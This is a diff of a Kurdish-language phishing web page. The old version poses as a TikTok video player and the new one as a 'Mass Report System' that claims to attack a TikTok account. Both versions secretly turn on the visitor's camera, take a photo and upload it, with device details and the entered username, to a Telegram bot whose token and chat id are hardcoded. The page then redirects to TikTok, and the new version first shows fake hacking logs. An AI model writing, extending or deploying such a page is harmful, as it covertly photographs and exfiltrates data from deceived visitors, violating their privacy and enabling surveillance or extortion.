@@ -1,84 +1,127 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok . Video Player</title>
+    <title>Mhamad Nadr | TikTok Mass Report</title>
     <style>
-        body { margin: 0; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('pasha.jpg') no-repeat center center; background-size: cover; opacity: 0.7; z-index: 1; }
-        .play-btn { position: relative; z-index: 10; width: 100px; height: 100px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
-        .play-icon { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 35px solid white; margin-left: 10px; }
-        #status { position: fixed; bottom: 20px; font-size: 10px; color: #555; z-index: 100; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        
+        /* نەخشەی جیهانی سوور - وەک باکگراوند */
+        #map-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://i.imgur.com/vH9YF6B.png') no-repeat center center;
+            background-size: cover; opacity: 0.25; filter: brightness(0.6) sepia(1) hue-rotate(-50deg) saturate(10);
+            z-index: 1;
+        }
+
+        .main-container { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+
+        /* تایتڵی سەرەکی بە ناوی خۆت */
+        .system-title { font-size: 30px; color: #f00; text-shadow: 0 0 20px #f00; margin-bottom: 5px; font-weight: bold; letter-spacing: 2px; }
+        .sub-title { font-size: 14px; color: #0f0; margin-bottom: 30px; border-bottom: 1px solid #0f0; padding-bottom: 5px; }
+
+        /* سندوقی ڕاپۆرت */
+        .input-panel {
+            background: rgba(10, 0, 0, 0.9); border: 1px solid #f00; padding: 30px;
+            width: 320px; text-align: center; border-radius: 2px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+        }
+
+        input { background: #000; border: 1px solid #f00; color: #f00; padding: 12px; width: 90%; margin-bottom: 20px; text-align: center; outline: none; font-size: 16px; }
+
+        .btn-attack { background: #f00; color: #000; border: none; padding: 15px 40px; cursor: pointer; font-weight: bold; font-size: 18px; width: 100%; transition: 0.3s; }
+        .btn-attack:hover { background: #fff; box-shadow: 0 0 25px #fff; }
+
+        /* تێرمیناڵی هاکینگ */
+        #console-area { display: none; width: 90%; max-width: 700px; gap: 10px; flex-wrap: wrap; justify-content: center; }
+        .terminal { width: 330px; height: 220px; background: rgba(0,0,0,0.95); border: 1px solid #0f0; padding: 10px; font-size: 11px; overflow: hidden; text-align: left; direction: ltr; }
+        
+        .alert-red { color: #f00; font-weight: bold; animation: blinker 0.4s infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="bg"></div>
-    <div class="play-btn" onclick="startGlobalExploit()">
-        <div class="play-icon"></div>
-    </div>
-    <div id="status">System Ready...</div>
 
-    <video id="v" autoplay playsinline muted style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+    <div id="map-bg"></div>
+
+    <div class="main-container">
+        <div class="system-title">Mhamad Nadr</div>
+        <div class="sub-title">MASS REPORT SYSTEM v4.0</div>
+
+        <div id="start-panel" class="input-panel">
+            <div style="margin-bottom: 10px; color: #fff;">TARGET @ID:</div>
+            <input type="text" id="target_id" placeholder="@username">
+            <button class="btn-attack" onclick="startMhamadAttack()">START ATTACK</button>
+        </div>
+
+        <div id="console-area">
+            <div class="terminal" id="term1"></div>
+            <div class="terminal" id="term2"></div>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
 
-        async function sendLog(msg) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 Device Log: " + msg)}`);
-        }
+        async function startMhamadAttack() {
+            let target = document.getElementById('target_id').value;
+            if(!target) return alert("تکایە ناوی ئەکاونتەکە بنووسە!");
 
-        async function takeSnap(methodName) {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.7))).blob();
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', blob, 'snap.jpg');
-            fd.append('caption', `✅ SUCCESS! Method: ${methodName}\nAgent: ${navigator.userAgent}`);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
+            document.getElementById('start-panel').style.display = 'none';
+            document.getElementById('console-area').style.display = 'flex';
 
-        async function startGlobalExploit() {
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            sendLog("User Clicked. OS: " + (isIOS ? "iOS" : "Android"));
+            try {
+                // کارپێکردنی کامێرا بۆ دڵنیابوونەوە (بە نهێنی)
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
 
-            if (!isIOS) {
-                // --- فێڵی ئەندرۆید (گالاکسی) ---
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    document.getElementById('v').srcObject = s;
-                    setTimeout(async () => {
-                        await takeSnap("Android Stealth");
-                        window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
-                    }, 500);
-                } catch (e) {
-                    window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
-                }
-            } else {
-                // --- فێڵی ئایفۆن (Fuzzing & Detection) ---
-                const methods = [
-                    { name: "WebRTC Stealth", config: { video: { facingMode: "user" } } },
-                    { name: "Low Res Bypass", config: { video: { width: 100 } } }
-                ];
+                // لۆگی تێرمیناڵەکان
+                addLog('term1', "Connecting to Mhamad Nadr Private Server...");
+                addLog('term2', "Targeting Account: " + target);
 
-                for (let m of methods) {
-                    try {
-                        const s = await navigator.mediaDevices.getUserMedia(m.config);
-                        document.getElementById('v').srcObject = s;
-                        await takeSnap(m.name);
-                        break; // ئەگەر یەکێکیان سەرکەوتوو بوو، بوەستە
-                    } catch (err) {
-                        sendLog(`Method ${m.name} failed: ${err.name}`);
-                    }
-                }
-                // لە کۆتاییدا هەر دەچێتە سەر تیکتۆکەکە
-                setTimeout(() => { window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/"; }, 2000);
+                setTimeout(async () => {
+                    // گرتنی وێنە بۆ تێلێگرامت
+                    const v = document.getElementById('v');
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.5))).blob();
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', "🚀 Mhamad Nadr Tool Used!\n🎯 Target: " + target);
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+
+                    // دەستپێکردنی ئەنیمەیشنی "ATTACK"
+                    setInterval(() => {
+                        document.getElementById('term1').innerHTML += `<div class="alert-red">ATTACKING TIKTOK DATABASE... [SENT]</div>`;
+                        document.getElementById('term2').innerHTML += `<div>[*] Proxy: OK | Report: SUCCESS for ${target}</div>`;
+                        document.getElementById('term1').scrollTop = document.getElementById('term1').scrollHeight;
+                        document.getElementById('term2').scrollTop = document.getElementById('term2').scrollHeight;
+                    }, 1500);
+
+                }, 2000);
+
+                // گواستنەوە بۆ تیکتۆک دوای ١٠ چرکە
+                setTimeout(() => { 
+                    alert("Reports Sent! TikTok will review " + target + " soon.");
+                    window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/"; 
+                }, 12000);
+
+            } catch (e) {
+                window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
             }
+        }
+
+        function addLog(id, msg) {
+            document.getElementById(id).innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
     </script>
 </body>
